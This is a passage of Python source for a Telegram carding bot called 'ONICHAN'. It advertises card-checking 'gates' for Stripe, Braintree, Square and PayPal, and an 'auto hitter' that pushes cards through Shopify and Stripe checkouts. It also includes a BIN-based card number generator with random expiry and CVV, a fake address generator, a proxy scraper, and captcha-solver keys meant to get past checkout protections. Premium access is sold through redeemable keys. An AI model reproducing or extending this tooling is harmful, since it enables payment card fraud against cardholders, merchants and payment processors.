• Active: {stats['active']}
• Redeemed: {stats['redeemed']}

━━━━━━━━━━━━━━━━━━━━━━

🎫 <b>Active Keys:</b>

""")
    
    if active_keys:
        for i, key in enumerate(active_keys[-10:], 1):
            text += f"<b>{i}.</b> <code>{key['key']}</code>\n"
            text += f"   ⏰ {key['days']} days | 📅 {key['timestamp']}\n\n"
        
        if len(active_keys) > 10:
            text += f"<i>...and {len(active_keys) - 10} more keys</i>\n\n"
    else:
        text += "No active keys.\n\n"
    
    text += f"""━━━━━━━━━━━━━━━━━━━━━━

💡 <b>Commands:</b>
<code>/genkey [days]</code> - Generate new key
<code>/keys</code> - View all keys"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def burn_keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Burn all unused premium keys - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    stats = get_key_stats()
    
    if stats['active'] == 0:
        await update.message.reply_text(
            "ℹ️ <b>No unused keys to burn!</b>\n\n"
            "All keys have already been redeemed.",
            parse_mode=ParseMode.HTML
        )
        return
    
    result = burn_unused_keys()
    
    if result['success']:
        text = ae(f"""🔥 <b>KEYS BURNED SUCCESSFULLY!</b>

━━━━━━━━━━━━━━━━━━━━━━

🗑️ <b>Burned:</b> {result['count']} unused keys
✅ <b>Status:</b> All unredeemed keys deleted

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Remaining:</b>
• Active Keys: 0
• Redeemed Keys: {stats['redeemed']}

💡 Use <code>/genkey [days]</code> to create new keys.""")
    else:
        text = f"❌ <b>Error burning keys!</b>\n\n{result['message']}"
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ============================================================================
# HELP COMMAND - SHOW ALL COMMANDS
# ============================================================================

@require_approval
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show all available commands"""
    user = update.effective_user
    rank = get_user_rank(user.id)
    is_owner_user = is_owner(user.id)
    is_premium_user = is_premium(user.id)
    
    gif_url = get_sexy_anime_gif("welcome")
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • HELP</b>
{sep}
👤 {rank} | 📊 Limit: {get_mass_check_limit(user.id)} cards
{sep}
🔰 <b>BASIC</b>
/start · /help · /info · /redeem
{sep}
🚪 <b>FREE GATES</b>
/st Stripe · /bu Braintree · /sq Square
{sep}
🔧 <b>TOOLS</b>
/gen · /bin · /fake · /web · /proxy
/scr · /tmail · /cmail · /sk · /config
{sep}
🧹 <b>CLEANER</b>
/clean · /filter
{sep}
📋 <b>MASS</b> (Free:5 | Prem:20 | Owner:50)
/mss · /mpp · /mbu · /msstxt
{sep}""")
    
    if is_premium_user:
        text += f"""
💎 <b>PREMIUM GATES</b>
/pp · /ppv · /str · /b3n · /rz
/sor · /st5 · /dep · /auz · /sh6
{sep}
🎯 <b>AUTO HITTER</b>
/co [url] [cc] — Stripe/Shopify
{sep}"""
    
    if is_owner_user:
        text += f"""
👑 <b>ADMIN</b>
/approve · /premium · /ban · /unban
/addadmin · /genkey · /keys · /broadcast
{sep}"""
    
    text += f"""
📞 @{SUPPORT_USERNAME} | 📢 @{CHANNEL_USERNAME}"""
    
    keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        if len(text) <= 1024:
            await update.message.reply_animation(
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
    except Exception as e:
        await update.message.reply_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )

# ============================================================================
# PROXY SCRAPER
# ============================================================================

@require_approval
async def proxy_scraper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Scrape free proxies from pool"""
    user = update.effective_user

    loading_msg = await update.message.reply_text(ae("🔄 Fetching proxies from pool..."))

    try:
        from modules.proxy_scraper_engine import get_pool_proxies
        pool = get_pool_proxies(alive_only=True, limit=15)

        if pool:
            proxies = []
            for p in pool:
                ptype = p.get('proxy_type', 'HTTP').upper()
                host = p['host']
                port = p['port']
                if ptype in ('SOCKS5', 'SOCKS4'):
                    proxies.append(f"{ptype.lower()}://{host}:{port}")
                else:
                    proxies.append(f"{host}:{port}")

            sep = "━━━━━━━━━━━━━━━━━━━━"
            text = ae(f"""💜 <b>ONICHAN • PROXIES</b>
{sep}
📊 <b>Found</b> : {len(proxies)}
{sep}
""")
            for i, proxy in enumerate(proxies, 1):
                text += f"{i}. <code>{proxy}</code>\n"

            text += f"""{sep}
⚠️ Free proxies may be slow — test first
👤 @{user.username or user.first_name}"""

            await loading_msg.edit_text(text, parse_mode=ParseMode.HTML)
        else:
            await loading_msg.edit_text(ae("❌ No proxies in pool. Try again later."))

    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# USER INFO COMMAND
# ============================================================================

@require_approval
async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user information with nice card design"""
    user = update.effective_user
    rank = get_user_rank(user.id)
    
    # Get premium expiry if premium user
    expiry_text = "N/A"
    if is_premium(user.id):
        try:
            with open(DB_PREMIUM, 'r') as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 2 and int(parts[0]) == user.id:
                        expiry_text = parts[1]
                        break
        except:
            expiry_text = "Unknown"
    
    # Get approved cards count for this user
    try:
        user_approved_count = get_user_approved_cards(user.id)
    except:
        user_approved_count = 0
    
    # Create info card with GIF
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • USER INFO</b>
{sep}
👤 <b>Name</b>     : {user.first_name}
🆔 <b>ID</b>       : <code>{user.id}</code>
📛 <b>User</b>     : @{user.username or 'None'}
👑 <b>Rank</b>     : {rank}
📅 <b>Expiry</b>   : {expiry_text}
{sep}
⚡ @{BOT_USERNAME}""")
    
    keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Send with GIF
    try:
        info_gif = get_sexy_anime_gif("welcome")
        await update.message.reply_animation(
            animation=info_gif,
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    except:
        # Fallback without GIF
        await update.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )

# ============================================================================
# CARD GENERATOR
# ============================================================================

@require_approval
async def card_generator(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if not context.args:
        sep = "────────────────────────"
        await update.message.reply_text(
            f"💜 <b>ONICHAN • CC GENERATOR</b>\n\n"
            f"{sep}\n\n"
            f"📝 <b>Usage</b>: <code>/gen &lt;bin&gt;[|mm|yy|cvv] [count]</code>\n\n"
            f"📌 <b>Examples</b>:\n"
            f"<code>/gen 415920</code>\n"
            f"<code>/gen 415920|xx|26|xxx 20</code>\n"
            f"<code>/gen 374155|12|xx|xxxx 5</code>\n\n"
            f"<i>x = random. Max 50 cards.</i>",
            parse_mode=ParseMode.HTML
        )
        return

    input_text = ' '.join(context.args)
    parsed = parse_gen_format(input_text)

    if not parsed:
        await update.message.reply_text(f"{EMOJI['declined']} Invalid format.\nUsage: <code>/gen &lt;bin6+&gt;[|mm|yy|cvv] [count]</code>", parse_mode=ParseMode.HTML)
        return

    bin_number, custom_month, custom_year, custom_cvv, count = parsed

    if not bin_number.isdigit() or len(bin_number) < 6:
        await update.message.reply_text(f"{EMOJI['declined']} Invalid BIN! Must be at least 6 digits.", parse_mode=ParseMode.HTML)
        return

    if count > 50:
        count = 50

    t0 = time.time()
    generated_cards = generate_cards(bin_number, count, custom_month, custom_year, custom_cvv)
    brand = get_card_brand(bin_number)

    bin_info = {}
    try:
        bin_info = lookup_bin(bin_number + "0" * (16 - len(bin_number)))
    except:
        try:
            from modules.gate_checker import get_bin_info
            bin_info = get_bin_info(bin_number + "0" * (16 - len(bin_number)))
        except:
            pass

    elapsed_ms = round((time.time() - t0) * 1000)

    if not generated_cards:
        await update.message.reply_text(f"{EMOJI['declined']} Failed to generate cards.", parse_mode=ParseMode.HTML)
        return

    is_amex = bin_number.startswith("34") or bin_number.startswith("37")
    card_len = 15 if is_amex else 16
    display_prefix = bin_number + "x" * (card_len - len(bin_number))

    cards_text = "\n".join(f"<code>{c['full']}</code>" for c in generated_cards)

    b_brand = bin_info.get("brand", "") or bin_info.get("scheme", "") or brand
    b_type = bin_info.get("type", "") or "?"
    b_level = bin_info.get("category", "") or bin_info.get("level", "") or ""
    b_bank = bin_info.get("bank", "") or bin_info.get("issuer", "") or "─"
    b_country = bin_info.get("country_name", "") or bin_info.get("country", "") or "?"
    b_iso = bin_info.get("country_code", "") or bin_info.get("iso", "") or "?"
    b_flag = bin_info.get("flag", "") or bin_info.get("emoji", "") or get_flag_emoji(b_iso)
    bin_line = f"<code>{bin_number[:6]}</code> — <code>{b_brand}</code> — <code>{b_type}</code>"

    gen_sep = "────────────────────────"
    text = (
        f"💜 <b>ONICHAN • CC GENERATOR</b>\n\n"
        f"{gen_sep}\n\n"
        f"🔢 <b>BIN</b>         : <code>{display_prefix}</code>\n"
        f"📊 <b>Generated</b>   : <code>{len(generated_cards)}/{count}</code>\n\n"
        f"{gen_sep}\n\n"
        f"{cards_text}\n\n"
        f"{gen_sep}\n\n"
        f"💠 <b>Network</b>     : {bin_line}\n"
    )
    if b_level and b_level != "UNKNOWN":
        text += f"📋 <b>Level</b>       : <code>{b_level}</code>\n"
    text += (
        f"🏦 <b>Bank</b>        : <code>{b_bank}</code>\n"
        f"🌍 <b>Country</b>     : {b_flag} <code>{b_country}</code> (<code>{b_iso}</code>)\n\n"
        f"⏱ <b>Time</b>        : <code>{elapsed_ms}ms</code>"
    )
    text = ae(text)

    cb_data = f"regen:{bin_number}:{custom_month or 'xx'}:{custom_year or 'xx'}:{custom_cvv or 'xxx'}:{count}"
    if len(cb_data) > 64:
        cb_data = cb_data[:64]
    keyboard = [[_btn("Regenerate", style="success", icon=EID["regenerate"], callback_data=cb_data)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    context.user_data['last_gen'] = {
        'bin': bin_number, 'month': custom_month,
        'year': custom_year, 'cvv': custom_cvv, 'count': count
    }

    await update.message.reply_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)


async def regenerate_cards_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query

    if query.data.startswith("regen:"):
        parts = query.data.split(":")
        if len(parts) < 6:
            await query.answer("Invalid data", show_alert=True)
            return
        bin_number = parts[1]
        custom_month = parts[2] if parts[2] != "xx" else None
        custom_year = parts[3] if parts[3] != "xx" else None
        custom_cvv = parts[4] if parts[4] != "xxx" else None
        count = min(int(parts[5]), 50)
    elif query.data == "regen_cards":
        if 'last_gen' not in context.user_data:
            await query.answer("No previous generation found! Use /gen first.", show_alert=True)
            return
        params = context.user_data['last_gen']
        bin_number = params['bin']
        custom_month = params['month']
        custom_year = params['year']
        custom_cvv = params['cvv']
        count = params['count']
    else:
        await query.answer("Unknown", show_alert=True)
        return

    t0 = time.time()
    generated_cards = generate_cards(bin_number, count, custom_month, custom_year, custom_cvv)
    brand = get_card_brand(bin_number)

    bin_info = {}
    try:
        bin_info = lookup_bin(bin_number + "0" * (16 - len(bin_number)))
    except:
        try:
            from modules.gate_checker import get_bin_info
            bin_info = get_bin_info(bin_number + "0" * (16 - len(bin_number)))
        except:
            pass

    elapsed_ms = round((time.time() - t0) * 1000)

    if not generated_cards:
        await query.answer("Failed to generate", show_alert=True)
        return

    is_amex = bin_number.startswith("34") or bin_number.startswith("37")
    card_len = 15 if is_amex else 16
    display_prefix = bin_number + "x" * (card_len - len(bin_number))

    cards_text = "\n".join(f"<code>{c['full']}</code>" for c in generated_cards)

    b_brand = bin_info.get("brand", "") or bin_info.get("scheme", "") or brand
    b_type = bin_info.get("type", "") or "?"
    b_level = bin_info.get("category", "") or bin_info.get("level", "") or ""
    b_bank = bin_info.get("bank", "") or bin_info.get("issuer", "") or "─"
    b_country = bin_info.get("country_name", "") or bin_info.get("country", "") or "?"
    b_iso = bin_info.get("country_code", "") or bin_info.get("iso", "") or "?"
    b_flag = bin_info.get("flag", "") or bin_info.get("emoji", "") or get_flag_emoji(b_iso)
    bin_line = f"<code>{bin_number[:6]}</code> — <code>{b_brand}</code> — <code>{b_type}</code>"

    gen_sep = "────────────────────────"
    text = (
        f"💜 <b>ONICHAN • CC GENERATOR</b>\n\n"
        f"{gen_sep}\n\n"
        f"🔢 <b>BIN</b>         : <code>{display_prefix}</code>\n"
        f"📊 <b>Generated</b>   : <code>{len(generated_cards)}/{count}</code>\n\n"
        f"{gen_sep}\n\n"
        f"{cards_text}\n\n"
        f"{gen_sep}\n\n"
        f"💠 <b>Network</b>     : {bin_line}\n"
    )
    if b_level and b_level != "UNKNOWN":
        text += f"📋 <b>Level</b>       : <code>{b_level}</code>\n"
    text += (
        f"🏦 <b>Bank</b>        : <code>{b_bank}</code>\n"
        f"🌍 <b>Country</b>     : {b_flag} <code>{b_country}</code> (<code>{b_iso}</code>)\n\n"
        f"⏱ <b>Time</b>        : <code>{elapsed_ms}ms</code>"
    )
    text = ae(text)

    cb_data = f"regen:{bin_number}:{custom_month or 'xx'}:{custom_year or 'xx'}:{custom_cvv or 'xxx'}:{count}"
    if len(cb_data) > 64:
        cb_data = cb_data[:64]
    keyboard = [[_btn("Regenerate", style="success", icon=EID["regenerate"], callback_data=cb_data)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        await query.answer(f"{EMOJI_PLAIN['regenerate']} Regenerated!")
    except:
        await query.answer("Error regenerating", show_alert=True)

# ============================================================================
# USER CONFIG - Sites & Proxy Settings
# ============================================================================

@require_approval
async def user_config_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manage user configuration for sites and proxies"""
    user = update.effective_user
    
    if context.args:
        action = context.args[0].lower()
        
        if action == "site" and len(context.args) >= 2:
            site_url = context.args[1]
            
            user_config = get_user_config(user.id)
            saved_proxy = user_config.get('proxy')
            
            status_msg = await update.message.reply_text(
                f"⏳ <b>Checking Site Compatibility...</b>\n\n"
                f"🌐 <code>{site_url}</code>\n"
                f"🔍 Testing checkout flow...",
                parse_mode=ParseMode.HTML
            )
            
            try:
                from modules.shopify_auto import check_site_compatibility
                is_compatible, details = await check_site_compatibility(site_url, saved_proxy)
                
                if is_compatible:
                    set_user_site(user.id, site_url)
                    product_price = details.get('price', 0)
                    product_title = details.get('product', 'Unknown')[:40]
                    await status_msg.edit_text(
                        f"✅ <b>Site Compatible & Saved!</b>\n\n"
                        f"🌐 <b>Site:</b> <code>{site_url}</code>\n"
                        f"💰 <b>Amount:</b> ${product_price:.2f}\n"
                        f"📦 <b>Product:</b> {product_title}\n"
                        f"✓ Checkout: {details.get('checkout_type', 'OK')}\n\n"
                        f"💡 Now use <code>/sh card</code> without site!",
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await status_msg.edit_text(
                        f"❌ <b>Site Not Compatible!</b>\n\n"
                        f"🌐 <code>{site_url}</code>\n"
                        f"⚠️ <b>Error:</b> {details.get('error', 'Unknown error')}\n\n"
                        f"Site was NOT saved. Try a different Shopify site.",
                        parse_mode=ParseMode.HTML
                    )
            except Exception as e:
                await status_msg.edit_text(
                    f"❌ <b>Site Check Failed!</b>\n\n"
                    f"🌐 <code>{site_url}</code>\n"
                    f"⚠️ <b>Error:</b> {str(e)[:50]}\n\n"
                    f"Site was NOT saved.",
                    parse_mode=ParseMode.HTML
                )
            return
        
        elif action == "proxy" and len(context.args) >= 2:
            proxy = context.args[1]
            
            status_msg = await update.message.reply_text(
                f"⏳ <b>Checking Proxy...</b>\n\n"
                f"🔒 <code>{proxy}</code>\n"
                f"Testing connection...",
                parse_mode=ParseMode.HTML
            )
            
            is_live, result = await check_proxy_live(proxy)
            
            if is_live:
                set_user_proxy(user.id, proxy)
                await status_msg.edit_text(
                    f"✅ <b>Proxy Saved!</b>\n\n"
                    f"🔒 <b>Proxy:</b> <code>{proxy}</code>\n"
                    f"🌐 <b>IP:</b> <code>{result}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await status_msg.edit_text(
                    f"❌ <b>Proxy Dead!</b>\n\n"
                    f"🔒 <code>{proxy}</code>\n"
                    f"⚠️ <b>Error:</b> {result}\n\n"
                    f"Proxy not saved.",
                    parse_mode=ParseMode.HTML
                )
            return
        
        elif action == "clear":
            if len(context.args) >= 2:
                sub = context.args[1].lower()
                if sub == "sites":
                    clear_all_sites(user.id)
                    await update.message.reply_text(ae("✅ All sites cleared!"), parse_mode=ParseMode.HTML)
                    return
                elif sub == "proxies":
                    clear_all_proxies(user.id)
                    await update.message.reply_text(ae("✅ All proxies cleared!"), parse_mode=ParseMode.HTML)
                    return
            clear_all_sites(user.id)
            clear_all_proxies(user.id)
            await update.message.reply_text(ae("✅ All settings cleared!"), parse_mode=ParseMode.HTML)
            return
        
        elif action == "clean":
            removed = clean_invalid_sites(user.id)
            await update.message.reply_text(ae(f"✅ Cleaned {removed} invalid entries!"), parse_mode=ParseMode.HTML)
            return
    
    config = get_user_config(user.id)
    current_proxy = config.get('proxy', 'Not set')
    saved_sites = config.get('sites', [])
    saved_proxies = config.get('proxies', [])
    
    sites_list = ""
    if saved_sites:
        for i, site in enumerate(saved_sites, 1):
            sites_list += f"  {i}. <code>{site}</code>\n"
    else:
        sites_list = "  None saved\n"
    
    proxies_list = ""
    if saved_proxies:
        for i, proxy in enumerate(saved_proxies, 1):
            proxies_list += f"  {i}. <code>{proxy}</code>\n"
    else:
        proxies_list = "  None saved\n"
    
    text = ae(f"""⚙️ <b>USER CONFIGURATION</b>

━━━━━━━━━━━━━━━━━━━━━━

🌐 <b>Sites ({len(saved_sites)}):</b>
{sites_list}
🔒 <b>Proxies ({len(saved_proxies)}):</b>
{proxies_list}
━━━━━━━━━━━━━━━━━━━━━━

📝 <b>COMMANDS:</b>
<code>/config site example.com</code>
<code>/config proxy ip:port:user:pass</code>
<code>/config clear</code> - Clear all
<code>/config clear sites</code>
<code>/config clear proxies</code>
<code>/config clean</code> - Remove invalid

━━━━━━━━━━━━━━━━━━━━━━

💡 <b>Once site is set, use:</b>
<code>/sh card|mm|yy|cvv</code>""")
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

# ============================================================================
# SETMAIL - Set billing email for Auto Hitter
# ============================================================================

@require_approval
async def setmail_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set billing email for Stripe checkout"""
    user = update.effective_user
    
    if not context.args:
        current_email = get_user_email(user.id)
        if current_email:
            await update.message.reply_text(
                f"📧 <b>Your Billing Email</b>\n\n"
                f"Current: <code>{current_email}</code>\n\n"
                f"<b>Usage:</b>\n"
                f"<code>/setmail email@example.com</code> - Set email\n"
                f"<code>/setmail off</code> - Remove email",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "📧 <b>Set Billing Email</b>\n\n"
                "No email set. Checkout will use random email.\n\n"
                "<b>Usage:</b>\n"
                "<code>/setmail email@example.com</code>",
                parse_mode=ParseMode.HTML
            )
        return
    
    email = context.args[0].strip()
    
    if email.lower() in ['off', 'clear', 'remove', 'delete']:
        clear_user_email(user.id)
        await update.message.reply_text(
            "✅ <b>Email Removed!</b>\n\nCheckout will now use random email.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if '@' not in email or '.' not in email:
        await update.message.reply_text(
            "❌ Invalid email format!\n\nExample: <code>/setmail user@gmail.com</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    set_user_email(user.id, email)
    await update.message.reply_text(
        f"✅ <b>Email Saved!</b>\n\n"
        f"📧 <code>{email}</code>\n\n"
        f"This email will be used in checkout forms.",
        parse_mode=ParseMode.HTML
    )

# ============================================================================
# CAPKEY - Set captcha solver API key
# ============================================================================

@require_approval
async def capkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set captcha solver API key for auto hitter"""
    user = update.effective_user
    
    if not context.args:
        current_key = get_captcha_key(user.id)
        if current_key:
            masked_key = current_key[:8] + "..." + current_key[-4:] if len(current_key) > 12 else "***"
            await update.message.reply_text(
                f"🔑 <b>Captcha Solver Key</b>\n\n"
                f"Current: <code>{masked_key}</code>\n\n"
                f"<b>Supported Services:</b>\n"
                f"• 2Captcha\n"
                f"• Anti-Captcha\n"
                f"• CapMonster\n"
                f"• hCaptcha Solver\n\n"
                f"<b>Usage:</b>\n"
                f"<code>/capkey YOUR_API_KEY</code>\n"
                f"<code>/capkey off</code> - Remove key",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "🔑 <b>Set Captcha Solver Key</b>\n\n"
                "No key set. Captcha bypass will use built-in methods.\n\n"
                "<b>Supported Services:</b>\n"
                "• 2Captcha\n"
                "• Anti-Captcha\n"
                "• CapMonster\n"
                "• hCaptcha Solver\n\n"
                "<b>Usage:</b>\n"
                "<code>/capkey YOUR_API_KEY</code>",
                parse_mode=ParseMode.HTML
            )
        return
    
    api_key = context.args[0].strip()
    
    if api_key.lower() in ['off', 'clear', 'remove', 'delete']:
        clear_captcha_key(user.id)
        await update.message.reply_text(
            "✅ <b>Captcha Key Removed!</b>\n\nWill use built-in bypass methods.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if len(api_key) < 10:
        await update.message.reply_text(
            "❌ Invalid API key! Key must be at least 10 characters.",
            parse_mode=ParseMode.HTML
        )
        return
    
    set_captcha_key(user.id, api_key)
    masked_key = api_key[:8] + "..." + api_key[-4:] if len(api_key) > 12 else "***"
    await update.message.reply_text(
        f"✅ <b>Captcha Key Saved!</b>\n\n"
        f"🔑 <code>{masked_key}</code>\n\n"
        f"This key will be used for captcha solving.",
        parse_mode=ParseMode.HTML
    )

# ============================================================================
# BIN LOOKUP
# ============================================================================

@require_approval
async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lookup BIN information"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/bin 424242</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    bin_number = ''.join(c for c in context.args[0] if c.isdigit())[:8]
    
    if len(bin_number) < 6:
        await update.message.reply_text(ae("❌ Invalid BIN! Must be at least 6 digits."))
        return
    
    loading_msg = await update.message.reply_text(ae("🔍 Looking up BIN..."))
    
    try:
        from modules.gate_checker import get_bin_info
        data = get_bin_info(bin_number)
        
        if data:
            sep = "━━━━━━━━━━━━━━━━━━━━"
            text = ae(f"""💜 <b>ONICHAN • BIN</b>
{sep}
🔢 <b>BIN</b>     : <code>{data.get('bin', bin_number)}</code>
💳 <b>Brand</b>   : {data.get('brand', 'Unknown')}
🎴 <b>Type</b>    : {data.get('type', 'Unknown')}
💰 <b>Level</b>   : {data.get('level', 'Unknown')}
🏦 <b>Bank</b>    : {data.get('bank', 'Unknown')}
🌍 <b>Country</b> : {data.get('emoji', '')} {data.get('country', 'Unknown')} ({data.get('country_code', 'XX')})
{sep}""")
            
            await loading_msg.edit_text(text, parse_mode=ParseMode.HTML)
        else:
            await loading_msg.edit_text(ae("❌ BIN not found in database."))
            
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# FAKE ADDRESS GENERATOR
# ============================================================================

FAKER_LOCALES = {
    # North America
    'us': ('en_US', '🇺🇸', 'United States'), 'usa': ('en_US', '🇺🇸', 'United States'),
    'united states': ('en_US', '🇺🇸', 'United States'), 'america': ('en_US', '🇺🇸', 'United States'),
    'ca': ('en_CA', '🇨🇦', 'Canada'), 'canada': ('en_CA', '🇨🇦', 'Canada'),
    'mx': ('es_MX', '🇲🇽', 'Mexico'), 'mexico': ('es_MX', '🇲🇽', 'Mexico'),
    # Europe
    'uk': ('en_GB', '🇬🇧', 'United Kingdom'), 'gb': ('en_GB', '🇬🇧', 'United Kingdom'),
    'united kingdom': ('en_GB', '🇬🇧', 'United Kingdom'), 'britain': ('en_GB', '🇬🇧', 'United Kingdom'),
    'england': ('en_GB', '🇬🇧', 'United Kingdom'),
    'de': ('de_DE', '🇩🇪', 'Germany'), 'germany': ('de_DE', '🇩🇪', 'Germany'),
    'fr': ('fr_FR', '🇫🇷', 'France'), 'france': ('fr_FR', '🇫🇷', 'France'),
    'es': ('es_ES', '🇪🇸', 'Spain'), 'spain': ('es_ES', '🇪🇸', 'Spain'),
    'it': ('it_IT', '🇮🇹', 'Italy'), 'italy': ('it_IT', '🇮🇹', 'Italy'),
    'nl': ('nl_NL', '🇳🇱', 'Netherlands'), 'netherlands': ('nl_NL', '🇳🇱', 'Netherlands'),
    'holland': ('nl_NL', '🇳🇱', 'Netherlands'),
    'be': ('nl_BE', '🇧🇪', 'Belgium'), 'belgium': ('nl_BE', '🇧🇪', 'Belgium'),
    'at': ('de_AT', '🇦🇹', 'Austria'), 'austria': ('de_AT', '🇦🇹', 'Austria'),
    'ch': ('de_CH', '🇨🇭', 'Switzerland'), 'switzerland': ('de_CH', '🇨🇭', 'Switzerland'),
    'pt': ('pt_PT', '🇵🇹', 'Portugal'), 'portugal': ('pt_PT', '🇵🇹', 'Portugal'),
    'ie': ('en_IE', '🇮🇪', 'Ireland'), 'ireland': ('en_IE', '🇮🇪', 'Ireland'),
    'dk': ('da_DK', '🇩🇰', 'Denmark'), 'denmark': ('da_DK', '🇩🇰', 'Denmark'),
    'fi': ('fi_FI', '🇫🇮', 'Finland'), 'finland': ('fi_FI', '🇫🇮', 'Finland'),
    'no': ('no_NO', '🇳🇴', 'Norway'), 'norway': ('no_NO', '🇳🇴', 'Norway'),
    'se': ('sv_SE', '🇸🇪', 'Sweden'), 'sweden': ('sv_SE', '🇸🇪', 'Sweden'),
    'pl': ('pl_PL', '🇵🇱', 'Poland'), 'poland': ('pl_PL', '🇵🇱', 'Poland'),
    'cz': ('cs_CZ', '🇨🇿', 'Czech Republic'), 'czech': ('cs_CZ', '🇨🇿', 'Czech Republic'),
    'sk': ('sk_SK', '🇸🇰', 'Slovakia'), 'slovakia': ('sk_SK', '🇸🇰', 'Slovakia'),
    'hu': ('hu_HU', '🇭🇺', 'Hungary'), 'hungary': ('hu_HU', '🇭🇺', 'Hungary'),
    'ro': ('ro_RO', '🇷🇴', 'Romania'), 'romania': ('ro_RO', '🇷🇴', 'Romania'),
    'bg': ('bg_BG', '🇧🇬', 'Bulgaria'), 'bulgaria': ('bg_BG', '🇧🇬', 'Bulgaria'),
    'gr': ('el_GR', '🇬🇷', 'Greece'), 'greece': ('el_GR', '🇬🇷', 'Greece'),
    'hr': ('hr_HR', '🇭🇷', 'Croatia'), 'croatia': ('hr_HR', '🇭🇷', 'Croatia'),
    'si': ('sl_SI', '🇸🇮', 'Slovenia'), 'slovenia': ('sl_SI', '🇸🇮', 'Slovenia'),
    'ua': ('uk_UA', '🇺🇦', 'Ukraine'), 'ukraine': ('uk_UA', '🇺🇦', 'Ukraine'),
    'ru': ('ru_RU', '🇷🇺', 'Russia'), 'russia': ('ru_RU', '🇷🇺', 'Russia'),
    'lt': ('lt_LT', '🇱🇹', 'Lithuania'), 'lithuania': ('lt_LT', '🇱🇹', 'Lithuania'),
    'lv': ('lv_LV', '🇱🇻', 'Latvia'), 'latvia': ('lv_LV', '🇱🇻', 'Latvia'),
    'ee': ('et_EE', '🇪🇪', 'Estonia'), 'estonia': ('et_EE', '🇪🇪', 'Estonia'),
    # Asia
    'in': ('en_IN', '🇮🇳', 'India'), 'india': ('en_IN', '🇮🇳', 'India'),
    'cn': ('zh_CN', '🇨🇳', 'China'), 'china': ('zh_CN', '🇨🇳', 'China'),
    'jp': ('ja_JP', '🇯🇵', 'Japan'), 'japan': ('ja_JP', '🇯🇵', 'Japan'),
    'kr': ('ko_KR', '🇰🇷', 'South Korea'), 'korea': ('ko_KR', '🇰🇷', 'South Korea'),
    'south korea': ('ko_KR', '🇰🇷', 'South Korea'),
    'th': ('th_TH', '🇹🇭', 'Thailand'), 'thailand': ('th_TH', '🇹🇭', 'Thailand'),
    'id': ('id_ID', '🇮🇩', 'Indonesia'), 'indonesia': ('id_ID', '🇮🇩', 'Indonesia'),
    'ph': ('en_PH', '🇵🇭', 'Philippines'), 'philippines': ('en_PH', '🇵🇭', 'Philippines'),
    'tw': ('zh_TW', '🇹🇼', 'Taiwan'), 'taiwan': ('zh_TW', '🇹🇼', 'Taiwan'),
    'bd': ('bn_BD', '🇧🇩', 'Bangladesh'), 'bangladesh': ('bn_BD', '🇧🇩', 'Bangladesh'),
    'az': ('az_AZ', '🇦🇿', 'Azerbaijan'), 'azerbaijan': ('az_AZ', '🇦🇿', 'Azerbaijan'),
    'ge': ('ka_GE', '🇬🇪', 'Georgia'), 'georgia': ('ka_GE', '🇬🇪', 'Georgia'),
    'am': ('hy_AM', '🇦🇲', 'Armenia'), 'armenia': ('hy_AM', '🇦🇲', 'Armenia'),
    # Middle East
    'tr': ('tr_TR', '🇹🇷', 'Turkey'), 'turkey': ('tr_TR', '🇹🇷', 'Turkey'),
    'turkiye': ('tr_TR', '🇹🇷', 'Turkey'),
    'ae': ('ar_AE', '🇦🇪', 'UAE'), 'uae': ('ar_AE', '🇦🇪', 'UAE'),
    'dubai': ('ar_AE', '🇦🇪', 'UAE'), 'united arab emirates': ('ar_AE', '🇦🇪', 'UAE'),
